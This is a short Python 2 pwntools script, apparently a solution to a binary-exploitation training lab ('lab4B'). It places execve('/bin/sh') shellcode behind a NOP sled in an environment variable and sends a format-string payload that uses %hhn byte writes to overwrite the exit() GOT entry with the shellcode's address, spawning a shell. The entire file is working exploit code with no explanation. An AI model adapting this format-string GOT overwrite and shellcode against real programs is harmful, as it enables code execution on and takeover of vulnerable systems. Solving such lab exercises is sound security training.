#!/usr/bin/env python2

from pwn import *

def run_exploit():
    shellcode = "\x90" * 1000 + "1\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80"
    p = process("/levels/lab04/lab4B", env = { "shellcode" : shellcode })

    # System address : 0xb7e63190
    # Shellcode env address : 0xbffffeff
    # Fourth : 0xbf
    # Second : 0xfe
    # Third  : 0xff
    # First  : 0xff

    payload = ""
    payload += "%1$190x."
    payload += "%20$hhn."
    payload += "%01$52x."
    payload += "%01$08x."
    payload += "%21$hhn."
    payload += "%022$hhn"
    payload += "%23$hhn."

    # exit() address : 0x80499b8
    payload += "\xbb\x99\x04\x08" # Fourth
    payload += "\xb9\x99\x04\x08" # Second
    payload += "\xba\x99\x04\x08" # Third
    payload += "\xb8\x99\x04\x08" # First

    p.sendline(payload)
    log.info("Received : %s" % p.recvall())

run_exploit()
